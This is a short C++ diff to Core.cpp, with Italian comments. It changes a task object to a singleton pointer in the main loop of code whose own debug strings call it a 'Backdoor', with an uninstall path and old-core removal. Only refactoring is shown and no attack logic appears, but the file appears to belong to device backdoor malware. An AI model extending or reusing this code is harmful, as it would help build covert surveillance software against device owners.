@@ -8,7 +8,7 @@
 #include "Core.h"
 
 Core::Core() {
-
+	taskObj = Task::self();
 }
 
 Core::~Core() {
@@ -82,11 +82,11 @@ BOOL Core::Run() {
 	// Rimuoviamo il vecchio core se presente
 	RemoveOldCore();
 
-	taskObj.StartNotification();
+	taskObj->StartNotification();
 
 	// Avviamo il core
 	LOOP {
-		if (taskObj.TaskInit() == FALSE) {
+		if (taskObj->TaskInit() == FALSE) {
 			DBG_TRACE(L"Debug - Core.cpp - TaskInit() FAILED\n", 1, FALSE);
 			ADDDEMOMESSAGE(L"Backdoor Init... FAILED\n");
 			DISPLAYDEMOMESSAGE(NULL);
@@ -97,7 +97,7 @@ BOOL Core::Run() {
 			DISPLAYDEMOMESSAGE(NULL);
 		}
 
-		if (taskObj.CheckActions() == FALSE) {
+		if (taskObj->CheckActions() == FALSE) {
 			DBG_TRACE(L"Debug - Core.cpp - CheckActions() [Uninstalling?] FAILED\n", 1, FALSE);
 			DISPLAYDEMOMESSAGE(L"Backdoor Uninstalled, reboot the device!");
 			return FALSE;
